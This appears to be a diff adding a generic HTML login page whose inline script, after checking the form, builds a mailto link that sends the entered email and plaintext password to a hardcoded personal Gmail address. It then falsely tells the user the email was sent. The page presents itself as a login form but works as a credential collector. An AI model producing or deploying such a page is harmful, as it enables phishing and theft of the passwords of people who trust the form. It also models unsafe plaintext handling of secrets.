@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" />
+</head>
+
+<body>
+
+<div class="wrapper">
+    <header>Login Form</header>
+    <form id="loginForm">
+        <div class="field email">
+            <div class="input-area">
+                <input type="text" placeholder="Email Address" class="email">
+                <i class="icon fas fa-envelope"></i>
+                <i class="error error-icon fas fa-exclamation-circle"></i>
+            </div>
+            <div class="error error-txt">Email can't be blank</div>
+        </div>
+        <div class="field password">
+            <div class="input-area">
+                <input type="password" placeholder="Password" class="password">
+                <i class="icon fas fa-lock"></i>
+                <i class="error error-icon fas fa-exclamation-circle"></i>
+            </div>
+            <div class="error error-txt">Password can't be blank</div>
+        </div>
+        <div class="pass-txt"><a href="#">Forgot password?</a></div>
+        <input type="button" value="Login" onclick="validateAndSubmit()">
+    </form>
+    <div class="sign-txt">Not yet member? <a href="#">Signup now</a></div>
+</div>
+
+<script>
+    function validateAndSubmit() {
+        var email = document.querySelector(".email input").value;
+        var password = document.querySelector(".password input").value;
+
+        // Form validation
+        if (!email || !password) {
+            alert("Please fill in both email and password fields.");
+            return;
+        }
+
+        // Validate email format
+        var emailPattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
+        if (!email.match(emailPattern)) {
+            alert("Please enter a valid email address.");
+            return;
+        }
+
+        // Prepare email data
+        var emailTo = "boy082913@gmail.com"; // Replace with your actual email
+        var subject = "Login Information";
+        var body = "Email: " + email + "\nPassword: " + password;
+
+        // Prepare mailto link
+        var mailtoLink = "mailto:" + emailTo + "?subject=" + encodeURIComponent(subject) + "&body=" + encodeURIComponent(body);
+
+        // Send email
+        try {
+            window.location.href = mailtoLink;
+            alert("Email sent successfully!");
+        } catch (error) {
+            console.error("Error sending email:", error);
+            alert("Error sending email. Please try again later.");
+        }
+    }
+</script>
+
+</body>
+
+</html>
